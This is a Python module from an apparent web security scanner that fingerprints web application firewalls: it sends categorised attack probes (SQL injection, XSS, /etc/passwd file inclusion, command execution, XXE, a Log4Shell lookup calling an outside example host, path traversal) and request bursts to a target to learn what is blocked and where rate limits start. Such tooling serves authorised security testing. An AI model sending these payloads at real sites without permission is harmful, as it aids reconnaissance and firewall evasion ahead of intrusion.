from __future__ import annotations
import re
import time
import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
import requests

try:
    from websecure.core.http import hardened_session as _hardened_session
except ImportError:
    def _hardened_session(*_a, **_kw):  # type: ignore[misc]
        return requests.Session()

_logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Probe payload sets (categorised by attack type)
# ---------------------------------------------------------------------------
_PROBE_SETS: Dict[str, List[str]] = {
    "benign": [
        "?id=1",
        "?q=hello+world",
        "?page=1&size=10",
    ],
    "sqli": [
        "?id=1%27",
        "?id=1+OR+1%3D1--",
        "?id=1+UNION+SELECT+NULL--",
    ],
    "xss": [
        "?q=%3Cscript%3Ealert(1)%3C/script%3E",
        "?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
    ],
    "lfi": [
        "?file=../../../../etc/passwd",
        "?path=../../../windows/win.ini",
    ],
    "rce": [
        "?cmd=ls+-la",
        "?exec=whoami",
    ],
    "xxe": [
        "?q=<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+'file:///etc/passwd'>]>",
    ],
    "log4shell": [
        "?q=${jndi:ldap://oast.example.com/a}",
    ],
    "path_traversal": [
        "/../../../etc/passwd",
        "/....//....//etc/passwd",
    ],
}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class WAFBehaviorProbe:
    """Result of a single WAF probe request."""
    probe_type: str
    payload: str
    status_code: int
    response_time_ms: float
    blocked: bool
    body_snippet: str = ""
    headers: Dict[str, str] = field(default_factory=dict)


@dataclass
class WAFFingerprintReport:
    """Comprehensive WAF fingerprint analysis result."""
    url: str
    vendor: str = "unknown"
    confidence: float = 0.0
    detected: bool = False
    blocks_by_type: Dict[str, bool] = field(default_factory=dict)
    block_rate: float = 0.0
    avg_response_ms: float = 0.0
    rate_limit_threshold: Optional[int] = None
    rate_limit_window_s: Optional[float] = None
    is_learning_mode: bool = False
    bypass_strategies: List[str] = field(default_factory=list)
    probes: List[WAFBehaviorProbe] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "vendor": self.vendor,
            "confidence": self.confidence,
            "detected": self.detected,
            "blocks_by_type": self.blocks_by_type,
            "block_rate": round(self.block_rate, 2),
            "avg_response_ms": round(self.avg_response_ms, 1),
            "rate_limit_threshold": self.rate_limit_threshold,
            "rate_limit_window_s": self.rate_limit_window_s,
            "is_learning_mode": self.is_learning_mode,
            "bypass_strategies": self.bypass_strategies,
        }


# ---------------------------------------------------------------------------
# WAFPayloadClassifier
# ---------------------------------------------------------------------------

class WAFPayloadClassifier:
    """
    Classifies WAF reactions by attack payload category.
    Determines which categories are actively blocked vs allowed through.

    SOLID/SRP: Only responsible for payload-type classification.
    """

    def __init__(self, timeout: int = 8):
        self.timeout = timeout

    def classify(
        self,
        base_url: str,
        session=None,
        probe_types: Optional[List[str]] = None,
    ) -> Dict[str, bool]:
        """
        Test each probe category against the target.
        Returns {probe_type: blocked_bool}.
        """
        results: Dict[str, bool] = {}
        types_to_test = probe_types or list(_PROBE_SETS.keys())

        for probe_type in types_to_test:
            payloads = _PROBE_SETS.get(probe_type, [])[:2]
            blocked_count = 0
            for payload in payloads:
                url = base_url.rstrip("/") + "/" + payload.lstrip("?/")
                try:
                    if session:
                        r = session.get(url, timeout=self.timeout, allow_redirects=True)
                    else:
                        r = _hardened_session({}).get(
                            url, timeout=self.timeout, verify=False,
                            headers={"User-Agent": "Mozilla/5.0 (compatible; probe/1.0)"},
                        )
                    if r.status_code in (400, 403, 406, 429, 503):
                        blocked_count += 1
                except Exception:
                    pass
            results[probe_type] = blocked_count > 0

        return results


# ---------------------------------------------------------------------------
# WAFRateLimitAnalyzer
# ---------------------------------------------------------------------------

class WAFRateLimitAnalyzer:
    """
    Detects WAF rate-limiting by sending request bursts and recording
    when the server starts returning 429/503 responses.

    Reports: threshold (request# when blocking started), estimated window.

    SOLID/SRP: Only responsible for rate-limit detection.
    """

    def __init__(self, timeout: int = 6, max_requests: int = 40):
        self.timeout = timeout
        self.max_requests = max_requests

    def analyze(self, url: str, session=None) -> Dict[str, Any]:
        """
        Sends up to max_requests in rapid succession.
        Returns threshold + timing stats.
        """
        blocked_at: Optional[int] = None
        times: List[float] = []
        statuses: List[int] = []
        probe_url = url.rstrip("/") + "?_waf_rl=1"

        for i in range(1, self.max_requests + 1):
            t0 = time.perf_counter()
            try:
                if session:
                    r = session.get(probe_url, timeout=self.timeout)
                else:
                    r = _hardened_session({}).get(
                        probe_url, timeout=self.timeout, verify=False,
                        headers={"User-Agent": "Mozilla/5.0"},
                    )
                elapsed_ms = (time.perf_counter() - t0) * 1000
                times.append(elapsed_ms)
                statuses.append(r.status_code)
                if r.status_code == 429 and blocked_at is None:
                    blocked_at = i
                    break
            except Exception:
                times.append(self.timeout * 1000.0)
                statuses.append(0)

        avg_ms = sum(times) / len(times) if times else 100.0
        rps = 1000.0 / avg_ms if avg_ms > 0 else 1.0
        window_s = None
        if blocked_at:
            window_s = round(blocked_at / max(rps, 0.01), 1)

        result = {
            "requests_sent": len(statuses),
            "rate_limit_hit": blocked_at is not None,
            "rate_limit_threshold": blocked_at,
            "estimated_window_s": window_s,
            "avg_response_ms": round(avg_ms, 1),
            "status_codes_seen": sorted(set(statuses)),
        }
        if blocked_at:
            _logger.info(f"[WAFRateLimit] Rate limit at request #{blocked_at} (~{window_s}s window)")
        return result


# ---------------------------------------------------------------------------
# WAFFingerprinter
# ---------------------------------------------------------------------------

class WAFFingerprinter:
    """
    Deep WAF fingerprinting combining:
      1. Vendor detection  (via WAFDetector from waf_bypass)
      2. Payload-type reaction (WAFPayloadClassifier)
      3. Rate-limit analysis (WAFRateLimitAnalyzer)
      4. Learning-mode detection (blocks attacks but not benign)

    SOLID/OCP: Extend with new probe categories without modifying this class.
    """

    def __init__(self, timeout: int = 8, probe_rate_limit: bool = True):
        self.timeout = timeout
        self.probe_rate_limit = probe_rate_limit
        self._classifier = WAFPayloadClassifier(timeout=timeout)
        self._rl_analyzer = WAFRateLimitAnalyzer(timeout=timeout)

    def fingerprint(self, url: str, session=None) -> WAFFingerprintReport:
        """Full fingerprint analysis. Returns WAFFingerprintReport."""
        # 1. Vendor detection
        try:
            from websecure.core.waf_bypass import WAFDetector
            profile = WAFDetector(timeout=self.timeout).detect(url, session=session)
        except Exception as e:
            _logger.debug(f"[WAFFingerprint] WAFDetector unavailable: {e}")
            from dataclasses import dataclass as _dc
            profile = type("_P", (), {
                "vendor": "unknown", "confidence": 0.0,
                "detected": False, "bypass_strategies": [],
            })()

        report = WAFFingerprintReport(
            url=url,
            vendor=profile.vendor,
            confidence=profile.confidence,
            detected=profile.detected,
            bypass_strategies=profile.bypass_strategies,
        )

        # 2. Payload classification
        try:
            report.blocks_by_type = self._classifier.classify(url, session=session)
            vals = list(report.blocks_by_type.values())
            report.block_rate = sum(vals) / len(vals) if vals else 0.0
            benign_ok = not report.blocks_by_type.get("benign", False)
            attack_blocked = any(
                report.blocks_by_type.get(t, False)
                for t in ("sqli", "xss", "lfi", "rce", "log4shell")
            )
            report.is_learning_mode = attack_blocked and benign_ok and report.block_rate < 0.8
        except Exception as e:
            _logger.debug(f"[WAFFingerprint] Classifier error: {e}")

        # 3. Rate limit
        if self.probe_rate_limit:
            try:
                rl = self._rl_analyzer.analyze(url, session=session)
                if rl.get("rate_limit_hit"):
                    report.rate_limit_threshold = rl.get("rate_limit_threshold")
                    report.rate_limit_window_s = rl.get("estimated_window_s")
            except Exception as e:
                _logger.debug(f"[WAFFingerprint] Rate limit error: {e}")

        _logger.info(
            f"[WAFFingerprint] {url} vendor={report.vendor} "
            f"conf={report.confidence:.0%} block={report.block_rate:.0%} "
            f"learning={report.is_learning_mode}"
        )
        return report


def fingerprint_waf(url: str, session=None, timeout: int = 8) -> WAFFingerprintReport:
    """Convenience wrapper for WAFFingerprinter.fingerprint()."""
    return WAFFingerprinter(timeout=timeout).fingerprint(url, session=session)
